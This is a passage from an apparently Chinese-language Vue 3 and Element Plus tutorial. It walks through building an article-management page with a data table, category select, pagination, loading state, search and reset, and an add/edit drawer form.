class="attr">label</span>=<span class="string">"文章标题"</span> <span class="attr">width</span>=<span class="string">"400"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">default</span>=<span class="string">"{ row }"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-link</span> <span class="attr">type</span>=<span class="string">"primary"</span> <span class="attr">:underline</span>=<span class="string">"false"</span>&gt;</span>{{ row.title }}<span class="tag">&lt;/<span class="name">el-link</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"分类"</span> <span class="attr">prop</span>=<span class="string">"cate_name"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"发表时间"</span> <span class="attr">prop</span>=<span class="string">"pub_date"</span>&gt;</span> <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"状态"</span> <span class="attr">prop</span>=<span class="string">"state"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"操作"</span> <span class="attr">width</span>=<span class="string">"100"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">default</span>=<span class="string">"{ row }"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">:icon</span>=<span class="string">"Edit"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">circle</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">plain</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">type</span>=<span class="string">"primary"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        @<span class="attr">click</span>=<span class="string">"onEditArticle(row)"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      &gt;</span><span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">:icon</span>=<span class="string">"Delete"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">circle</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">plain</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">type</span>=<span class="string">"danger"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        @<span class="attr">click</span>=<span class="string">"onDeleteArticle(row)"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      &gt;</span><span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">template</span> #<span class="attr">empty</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-empty</span> <span class="attr">description</span>=<span class="string">"没有数据"</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line">&lt;/el-table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onEditArticle</span> = (<span class="params">row</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(row)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onDeleteArticle</span> = (<span class="params">row</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(row)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="中英国际化处理"><a href="#中英国际化处理" class="headerlink" title="中英国际化处理"></a>中英国际化处理</h3><p>默认是英文的，由于这里不涉及切换， 所以在 App.vue 中直接导入设置成中文即可，</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> zh <span class="keyword">from</span> <span class="string">'element-plus/es/locale/lang/zh-cn.mjs'</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- 国际化处理 --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-config-provider</span> <span class="attr">:locale</span>=<span class="string">"zh"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">router-view</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-config-provider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="文章分类选择"><a href="#文章分类选择" class="headerlink" title="文章分类选择"></a>文章分类选择</h3><p>为了便于维护，直接拆分成一个小组件 ChannelSelect.vue</p><ol><li>新建 article/components/ChannelSelect.vue</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-select</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"新闻"</span> <span class="attr">value</span>=<span class="string">"新闻"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"体育"</span> <span class="attr">value</span>=<span class="string">"体育"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中导入渲染</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import ChannelSelect from './components/ChannelSelect.vue'</span><br><span class="line"></span><br><span class="line">&lt;el-form-item label="文章分类："&gt;</span><br><span class="line">  &lt;channel-select&gt;&lt;/channel-select&gt;</span><br><span class="line">&lt;/el-form-item&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>调用接口，动态渲染下拉分类，设计成 v-model 的使用方式</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> { artGetChannelsService } <span class="keyword">from</span> <span class="string">'@/api/article'</span></span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">defineProps</span>({</span><br><span class="line">  <span class="attr">modelValue</span>: {</span><br><span class="line">    <span class="attr">type</span>: [<span class="title class_">Number</span>, <span class="title class_">String</span>]</span><br><span class="line">  }</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> emit = <span class="title function_">defineEmits</span>([<span class="string">'update:modelValue'</span>])</span><br><span class="line"><span class="keyword">const</span> channelList = <span class="title function_">ref</span>([])</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getChannelList</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">artGetChannelsService</span>()</span><br><span class="line">  channelList.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">}</span><br><span class="line"><span class="title function_">getChannelList</span>()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-select</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">:modelValue</span>=<span class="string">"modelValue"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    @<span class="attr">update:modelValue</span>=<span class="string">"emit('update:modelValue', $event)"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-option</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">v-for</span>=<span class="string">"channel in channelList"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">:key</span>=<span class="string">"channel.id"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">:label</span>=<span class="string">"channel.cate_name"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">:value</span>=<span class="string">"channel.id"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    &gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>父组件定义参数绑定</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> params = <span class="title function_">ref</span>({</span><br><span class="line">  <span class="attr">pagenum</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">pagesize</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">cate_id</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">state</span>: <span class="string">''</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">&lt;channel-select v-model=<span class="string">"params.cate_id"</span>&gt;&lt;/channel-select&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>发布状态，也绑定一下，便于将来提交表单</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-select v-model=<span class="string">"params.state"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"已发布"</span> <span class="attr">value</span>=<span class="string">"已发布"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"草稿"</span> <span class="attr">value</span>=<span class="string">"草稿"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line">&lt;/el-select&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="封装-API-接口，请求渲染"><a href="#封装-API-接口，请求渲染" class="headerlink" title="封装 API 接口，请求渲染"></a>封装 API 接口，请求渲染</h3><p><strong>没有数据，可以登录已完成的系统，添加几条数据</strong></p><ol><li><code>api/article.js</code>封装接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artGetListService</span> = (<span class="params">params</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">get</span>(<span class="string">'/my/article/list'</span>, { params })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中调用保存数据</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> articleList = <span class="title function_">ref</span>([])</span><br><span class="line"><span class="keyword">const</span> total = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getArticleList</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">artGetListService</span>(params.<span class="property">value</span>)</span><br><span class="line">  articleList.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">  total.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">total</span></span><br><span class="line">}</span><br><span class="line"><span class="title function_">getArticleList</span>()</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>新建 <code>utils/format.js</code> 封装格式化日期函数</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { dayjs } <span class="keyword">from</span> <span class="string">'element-plus'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">formatTime</span> = (<span class="params">time</span>) =&gt; <span class="title function_">dayjs</span>(time).<span class="title function_">format</span>(<span class="string">'YYYY年MM月DD日'</span>)</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>导入使用</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import { formatTime } from '@/utils/format'</span><br><span class="line"></span><br><span class="line">&lt;el-table-column label="发表时间"&gt;</span><br><span class="line">  &lt;template #default="{ row }"&gt;</span><br><span class="line">    {{ formatTime(row.pub_date) }}</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">&lt;/el-table-column&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="分页渲染-element-plus-分页"><a href="#分页渲染-element-plus-分页" class="headerlink" title="分页渲染 [element-plus 分页]"></a>分页渲染 [element-plus 分页]</h3><ol><li>分页组件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-pagination</span><br><span class="line">  v-<span class="attr">model</span>:current-page=<span class="string">"params.pagenum"</span></span><br><span class="line">  v-<span class="attr">model</span>:page-size=<span class="string">"params.pagesize"</span></span><br><span class="line">  :page-sizes=<span class="string">"[2, 3, 4, 5, 10]"</span></span><br><span class="line">  layout=<span class="string">"jumper, total, sizes, prev, pager, next"</span></span><br><span class="line">  background</span><br><span class="line">  :total=<span class="string">"total"</span></span><br><span class="line">  @size-change=<span class="string">"onSizeChange"</span></span><br><span class="line">  @current-change=<span class="string">"onCurrentChange"</span></span><br><span class="line">  style=<span class="string">"margin-top: 20px; justify-content: flex-end"</span></span><br><span class="line">/&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>提供分页修改逻辑</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onSizeChange</span> = (<span class="params">size</span>) =&gt; {</span><br><span class="line">  params.<span class="property">value</span>.<span class="property">pagenum</span> = <span class="number">1</span></span><br><span class="line">  params.<span class="property">value</span>.<span class="property">pagesize</span> = size</span><br><span class="line">  <span class="title function_">getArticleList</span>()</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onCurrentChange</span> = (<span class="params">page</span>) =&gt; {</span><br><span class="line">  params.<span class="property">value</span>.<span class="property">pagenum</span> = page</span><br><span class="line">  <span class="title function_">getArticleList</span>()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="添加-loading-处理"><a href="#添加-loading-处理" class="headerlink" title="添加 loading 处理"></a>添加 loading 处理</h3><ol><li>准备数据</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>el-table上面绑定</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-table v-loading=<span class="string">"loading"</span> &gt; ... &lt;/el-table&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>发送请求时添加 loading</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getArticleList</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  loading.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">    </span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  loading.<span class="property">value</span> = <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"><span class="title function_">getArticleList</span>()</span><br></pre></td></tr></tbody></table></figure><h3 id="搜索-和-重置功能"><a href="#搜索-和-重置功能" class="headerlink" title="搜索 和 重置功能"></a>搜索 和 重置功能</h3><ol><li>注册事件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form-item&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"onSearch"</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"onReset"</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line">&lt;/el-form-item&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>绑定处理</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onSearch</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  params.<span class="property">value</span>.<span class="property">pagenum</span> = <span class="number">1</span></span><br><span class="line">  <span class="title function_">getArticleList</span>()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onReset</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  params.<span class="property">value</span>.<span class="property">pagenum</span> = <span class="number">1</span></span><br><span class="line">  params.<span class="property">value</span>.<span class="property">cate_id</span> = <span class="string">''</span></span><br><span class="line">  params.<span class="property">value</span>.<span class="property">state</span> = <span class="string">''</span></span><br><span class="line">  <span class="title function_">getArticleList</span>()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="文章发布-修改-element-plus-抽屉"><a href="#文章发布-修改-element-plus-抽屉" class="headerlink" title="文章发布&amp;修改 [element-plus - 抽屉]"></a>文章发布&amp;修改 [element-plus - 抽屉]</h2><h3 id="点击显示抽屉"><a href="#点击显示抽屉" class="headerlink" title="点击显示抽屉"></a>点击显示抽屉</h3><ol><li>准备数据</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">const</span> visibleDrawer = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>准备抽屉容器</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-drawer</span><br><span class="line">  v-model=<span class="string">"visibleDrawer"</span></span><br><span class="line">  title=<span class="string">"大标题"</span></span><br><span class="line">  direction=<span class="string">"rtl"</span></span><br><span class="line">  size=<span class="string">"50%"</span></span><br><span class="line">&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Hi there!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">&lt;/el-drawer&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>点击修改布尔值显示抽屉</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-button type=<span class="string">"primary"</span> @click=<span class="string">"onAddArticle"</span>&gt;发布文章&lt;/el-button&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> visibleDrawer = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onAddArticle</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  visibleDrawer.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="封装抽屉组件-ArticleEdit"><a href="#封装抽屉组件-ArticleEdit" class="headerlink" title="封装抽屉组件 ArticleEdit"></a>封装抽屉组件 ArticleEdit</h3><p>添加 和 编辑，可以共用一个抽屉，所以可以将抽屉封装成一个组件</p><p>组件对外暴露一个方法 open,  基于 open 的参数，初始化表单数据，并判断区分是添加 还是 编辑</p><ol><li>open({ })                   =&gt;  添加操作，添加表单初始化无数据</li><li>open({ id: xx,  …  })  =&gt;  编辑操作，编辑表单初始化需回显</li></ol><p>具体实现：</p><ol><li>封装组件 <code>article/components/ArticleEdit.vue</code></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">const</span> visibleDrawer = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">open</span> = (<span class="params">row</span>) =&gt; {</span><br><span class="line">  visibleDrawer.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(row)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">defineExpose</span>({</span><br><span class="line">  open</span><br><span class="line">})</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- 抽屉 --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-drawer</span> <span class="attr">v-model</span>=<span class="string">"visibleDrawer"</span> <span class="attr">title</span>=<span class="string">"大标题"</span> <span class="attr">direction</span>=<span class="string">"rtl"</span> <span class="attr">size</span>=<span class="string">"50%"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>Hi there!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-drawer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>通过 ref 绑定</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> articleEditRef = <span class="title function_">ref</span>()</span><br><span class="line"></span><br><span class="line">&lt;!-- 弹窗 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">article-edit</span> <span class="attr">ref</span>=<span class="string">"articleEditRef"</span>&gt;</span><span class="tag">&lt;/<span class="name">article-edit</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>点击调用方法显示弹窗</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 编辑新增逻辑</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onAddArticle</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  articleEditRef.<span class="property">value</span>.<span class="title function_">open</span>({})</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onEditArticle</span> = (<span class="params">row</span>) =&gt; {</span><br><span class="line">  articleEditRef.<span class="property">value</span>.<span class="title function_">open</span>(row)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="完善抽屉表单结构"><a href="#完善抽屉表单结构" class="headerlink" title="完善抽屉表单结构"></a>完善抽屉表单结构</h3><ol><li>准备数据</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formModel = <span class="title function_">ref</span>({</span><br><span class="line">  <span class="attr">title</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">cate_id</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">cover_img</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">content</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">state</span>: <span class="string">''</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">open</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  visibleDrawer.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span> (row.<span class="property">id</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'编辑回显'</span>)</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'添加功能'</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>准备 form 表单结构</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ChannelSelect</span> <span class="keyword">from</span> <span class="string">'./ChannelSelect.vue'</span></span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-drawer</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">v-model</span>=<span class="string">"visibleDrawer"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">:title</span>=<span class="string">"formModel.id ? '编辑文章' : '添加文章'"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">direction</span>=<span class="string">"rtl"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">size</span>=<span class="string">"50%"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- 发表文章表单 --&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">:model</span>=<span class="string">"formModel"</span> <span class="attr">ref</span>=<span class="string">"formRef"</span> <span class="attr">label-width</span>=<span class="string">"100px"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"文章标题"</span> <span class="attr">prop</span>=<span class="string">"title"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"formModel.title"</span> <span class="attr">placeholder</span>=<span class="string">"请输入标题"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"文章分类"</span> <span class="attr">prop</span>=<span class="string">"cate_id"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">channel-select</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">v-model</span>=<span class="string">"formModel.cate_id"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">width</span>=<span class="string">"100%"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span><span class="tag">&lt;/<span class="name">channel-select</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"文章封面"</span> <span class="attr">prop</span>=<span class="string">"cover_img"</span>&gt;</span> 文件上传 <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"文章内容"</span> <span class="attr">prop</span>=<span class="string">"content"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"editor"</span>&gt;</span>富文本编辑器<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>发布<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"info"</span>&gt;</span>草稿<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> 